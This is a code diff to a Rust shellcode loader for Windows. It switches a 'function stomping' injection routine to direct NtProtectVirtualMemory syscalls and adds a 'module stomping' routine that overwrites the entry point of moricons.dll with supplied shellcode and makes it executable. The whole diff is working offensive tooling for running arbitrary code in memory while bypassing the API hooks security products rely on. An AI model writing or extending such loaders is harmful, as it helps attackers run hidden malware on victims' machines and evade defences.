@@ -104,14 +104,14 @@ use std::ptr::copy_nonoverlapping;
 #[cfg(feature = "InjectionFunctionStomping")]
 use windows_sys::Win32::{
     Foundation::HMODULE,
-    System::{
-        LibraryLoader::{GetProcAddress, LoadLibraryA},
-        Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE},
-    },
+    System::LibraryLoader::{GetProcAddress, LoadLibraryA},
 };
 
 #[cfg(feature = "InjectionFunctionStomping")]
 use windows_sys::s;
+
+#[cfg(feature = "InjectionFunctionStomping")]
+use rust_syscalls::syscall;
 
 #[cfg(feature = "InjectionFunctionStomping")]
 pub fn inject_function_stomping(shellcode: &[u8]) -> Result<*mut c_void, i32> {
@@ -120,14 +120,22 @@ pub fn inject_function_stomping(shellcode: &[u8]) -> Result<*mut c_void, i32> {
         let h_module = LoadLibraryA(s!("user32"));
         let func_address = GetProcAddress(h_module, s!("MessageBoxA"));
         let func_ptr = func_address.unwrap() as *mut c_void;
-        // Change memory protection to RW
+        
+        // Change memory protection to RW using NtProtectVirtualMemory
+        let mut address_to_protect = func_ptr;
+        let mut size_to_protect = shellcode.len();
         let mut old_protect: u32 = 0;
-        if VirtualProtect(
-            func_ptr,
-            shellcode.len(),
-            PAGE_READWRITE,
-            &mut old_protect,
-        ) == 0 {
+        
+        let status: i32 = syscall!(
+            "NtProtectVirtualMemory",
+            -1isize,
+            &mut address_to_protect as *mut *mut c_void,
+            &mut size_to_protect as *mut usize,
+            0x04u32, // PAGE_READWRITE
+            &mut old_protect as *mut u32
+        );
+        
+        if status != 0 {
             return Err(-1);
         }
 
@@ -138,16 +146,120 @@ pub fn inject_function_stomping(shellcode: &[u8]) -> Result<*mut c_void, i32> {
             shellcode.len(),
         );
 
-        // Restore memory protection to RX
-        if VirtualProtect(
-            func_ptr,
-            shellcode.len(),
-            PAGE_EXECUTE_READ,
-            &mut old_protect,
-        ) == 0 {
-            return Err(-1);
+        // Restore memory protection to RX using NtProtectVirtualMemory
+        let mut address_to_protect = func_ptr;
+        let mut size_to_protect = shellcode.len();
+        
+        let status: i32 = syscall!(
+            "NtProtectVirtualMemory",
+            -1isize,
+            &mut address_to_protect as *mut *mut c_void,
+            &mut size_to_protect as *mut usize,
+            0x20u32, // PAGE_EXECUTE_READ
+            &mut old_protect as *mut u32
+        );
+        
+        if status != 0 {
+            return Err(-2);
         }
 
         Ok(func_ptr)
+    }
+}
+
+// =======================================================================================================
+// INJECTION METHOD: MODULE STOMPING
+// =======================================================================================================
+
+#[cfg(feature = "InjectionModuleStomping")]
+use std::ptr::copy_nonoverlapping;
+
+#[cfg(feature = "InjectionModuleStomping")]
+use windows_sys::Win32::{
+    Foundation::{BOOL, HANDLE},
+    System::{
+        Diagnostics::Debug::IMAGE_NT_HEADERS64,
+        LibraryLoader::{LoadLibraryExA, DONT_RESOLVE_DLL_REFERENCES},
+        SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
+        Threading::{CreateThread, THREAD_CREATION_FLAGS},
+    },
+};
+
+#[cfg(feature = "InjectionModuleStomping")]
+use windows_sys::s;
+
+#[cfg(feature = "InjectionModuleStomping")]
+use rust_syscalls::syscall;
+
+#[cfg(feature = "InjectionModuleStomping")]
+pub fn inject_module_stomping(shellcode: &[u8]) -> Result<*mut c_void, i32> {
+    unsafe {
+        // Load the target DLL and retrieve the entry point address
+        let entry_point = load_library_entry_point()?;
+        
+        // Change the memory protection of the entry point to PAGE_READWRITE using NtProtectVirtualMemory
+        let mut address_to_protect = entry_point;
+        let mut size_to_protect = shellcode.len();
+        let mut old_protect: u32 = 0;
+        
+        let status: i32 = syscall!(
+            "NtProtectVirtualMemory",
+            -1isize,
+            &mut address_to_protect as *mut *mut c_void,
+            &mut size_to_protect as *mut usize,
+            0x04u32, // PAGE_READWRITE
+            &mut old_protect as *mut u32
+        );
+        
+        if status != 0 {
+            return Err(-1);
+        }
+
+        // Copy the shellcode over the entry point
+        copy_nonoverlapping(shellcode.as_ptr(), entry_point.cast(), shellcode.len());
+
+        // Change memory protection to PAGE_EXECUTE_READ for execution using NtProtectVirtualMemory
+        let mut address_to_protect = entry_point;
+        let mut size_to_protect = shellcode.len();
+        
+        let status: i32 = syscall!(
+            "NtProtectVirtualMemory",
+            -1isize,
+            &mut address_to_protect as *mut *mut c_void,
+            &mut size_to_protect as *mut usize,
+            0x20u32, // PAGE_EXECUTE_READ
+            &mut old_protect as *mut u32
+        );
+        
+        if status != 0 {
+            return Err(-2);
+        }
+
+        Ok(entry_point)
+    }
+}
+
+#[cfg(feature = "InjectionModuleStomping")]
+fn load_library_entry_point() -> Result<*mut c_void, i32> {
+    unsafe {
+        let module = LoadLibraryExA(
+            s!("moricons.dll"),
+            std::ptr::null_mut(),
+            DONT_RESOLVE_DLL_REFERENCES,
+        );
+
+        if module.is_null() {
+            return Err(-1);
+        }
+
+        let dos_header = module as *mut IMAGE_DOS_HEADER;
+        let nt_header = (module as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
+        
+        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
+            return Err(-2);
+        }
+
+        let entry_point = (module as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut c_void;
+        Ok(entry_point)
     }
 }
